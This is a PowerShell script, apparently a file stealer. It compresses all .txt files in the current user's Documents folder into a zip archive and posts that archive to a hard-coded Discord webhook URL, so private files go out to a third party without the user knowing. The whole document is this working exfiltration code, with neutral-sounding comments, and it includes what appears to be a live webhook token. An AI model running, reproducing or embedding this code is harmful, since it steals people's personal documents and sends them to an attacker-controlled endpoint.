# Define the path to the documents folder
$documentsPath = "$env:USERPROFILE\Documents"
# Define the path to the zip file
$zipFilePath = "$documentsPath\txt_files.zip"
# Discord webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1243581518152990801/HeVZuyvWfQSYBl1ipXcbIEb2uIScSwlrXj6lazDoujaA741SdO4idCw8nhchRScTwinE"

# Compress all .txt files into a zip file
Compress-Archive -Path "$documentsPath\*.txt" -DestinationPath $zipFilePath -Force

# Prepare the file for upload
$fileBytes = [System.IO.File]::ReadAllBytes($zipFilePath)
$fileName = [System.IO.Path]::GetFileName($zipFilePath)
$boundary = [System.Guid]::NewGuid().ToString()
$body = "--$boundary`r`nContent-Disposition: form-data; name=`"file`"; filename=`"$fileName`"`r`nContent-Type: application/octet-stream`r`n`r`n"
$body += [System.Text.Encoding]::UTF8.GetString($fileBytes)
$body += "`r`n--$boundary--`r`n"

# Create a web request to send the file to Discord
$webRequest = [System.Net.HttpWebRequest]::Create($webhookUrl)
$webRequest.Method = "POST"
$webRequest.ContentType = "multipart/form-data; boundary=$boundary"
$webRequest.ContentLength = [System.Text.Encoding]::UTF8.GetByteCount($body)
$webRequestStream = $webRequest.GetRequestStream()
$webRequestStream.Write([System.Text.Encoding]::UTF8.GetBytes($body), 0, [System.Text.Encoding]::UTF8.GetByteCount($body))
$webRequestStream.Close()

# Get the response from the server
$webResponse = $webRequest.GetResponse()
$webResponseStream = $webResponse.GetResponseStream()
$reader = New-Object System.IO.StreamReader($webResponseStream)
$responseContent = $reader.ReadToEnd()
$reader.Close()
$webResponseStream.Close()
$webResponse.Close()
